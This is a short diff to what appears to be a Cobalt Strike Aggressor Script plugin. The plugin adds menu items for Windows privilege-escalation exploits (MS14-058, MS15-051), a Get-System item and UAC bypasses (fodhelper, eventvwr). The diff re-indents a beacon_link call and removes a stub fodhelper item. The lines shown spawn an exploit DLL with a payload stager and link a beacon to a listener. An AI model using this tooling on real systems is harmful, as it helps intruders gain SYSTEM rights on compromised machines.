@@ -129,7 +129,7 @@ item "MS14-058"{
       }
       $stager = payload($3['listener'], $arch);
     bdllspawn!($bid, $dll, $stager, "ms14-058", 5000);
-       beacon_link($bid, $null, $3['listener']);
+    beacon_link($bid, $null, $3['listener']);
   }
 
    item "MS15-051"{
@@ -329,10 +329,6 @@ item "Get-System" {
     }
 
 menu "Bypass_uac" {
-    item "fodhelper" {
-        show_message("Faild to Test!");
-    }
-     separator();
      menu "Eventvwr_uac(Win7)" {
         item "Eventvwr_for_powershell" {
         $dialog = dialog("BypassUac for eventvwr",%(bid => $1['@']),&eventvwr_uac);
